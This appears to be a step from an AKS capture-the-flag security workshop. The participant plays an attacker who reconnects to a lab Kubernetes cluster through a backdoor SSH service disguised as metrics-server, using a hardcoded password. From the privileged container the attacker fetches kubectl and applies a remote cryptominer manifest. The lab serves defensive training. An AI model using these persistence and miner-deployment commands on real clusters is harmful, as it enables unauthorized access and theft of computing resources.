title: Persistence - Scenario 2 Attack
sidebar_position: 5

## Backstory

### Name: __Red__

* Opportunist
* Easy money via crypto-mining
* Uses automated scans of web IP space looking for known exploits and vulnerabilities

### Motivations

* __Red__ notices that public access to the cluster is gone and the cryptominers have stopped reporting in
* __Red__ is excited to discover that the SSH server they left behind is still active

## Re-establishing a Foothold

__Red__ reconnects to the cluster using the SSH service disguised as a *metrics-server* on the cluster. While having access to an individual container may not seem like much of a risk at first glance, this container has two characteristics that make it very dangerous:  

* There is a service account associated with the container which has been granted access to all kubernetes APIs
* The container is running with a privileged security context which grants it direct access to the host OS

## Deploying Miners

You will need the SSH server IP address that was deployed in the previous attack.  You can fetch it again in the hacked app by running:
```bash
SSH_SERVER_IP=$(kubectl get svc metrics-server-service -n kube-system -o table -o jsonpath='{.status.loadBalancer.ingress[0].ip}')
echo $SSH_SERVER_IP
echo "SSH password is: Sup3r_S3cr3t_P@ssw0rd"
ssh root@$SSH_SERVER_IP -p 8080 -o StrictHostKeyChecking=no
```

Let's re-download kubectl and create our miner:
```bash
apk update
apk add curl
cd /usr/local/bin
curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"
chmod 555 kubectl
export KUBERNETES_SERVICE_HOST=kubernetes.default.svc
export KUBERNETES_SERVICE_PORT=443
kubectl apply -f https://raw.githubusercontent.com/azure/aks-ctf/refs/heads/main/workshop/scenario_1/bitcoinero.yaml
```

Verify that the pod is running:
```bash
kubectl get pods -n dev
```

The output should look something like this:
```bash
NAME                           READY   STATUS    RESTARTS   AGE
bitcoinero-6b95755447-cttkz    1/1     Running   0          23s
insecure-app-66dffb686-tp46w   1/1     Running   0          24m
```

Time for some celebratory pizza! Go ahead and logout of the ssh session.
```bash
exit
```
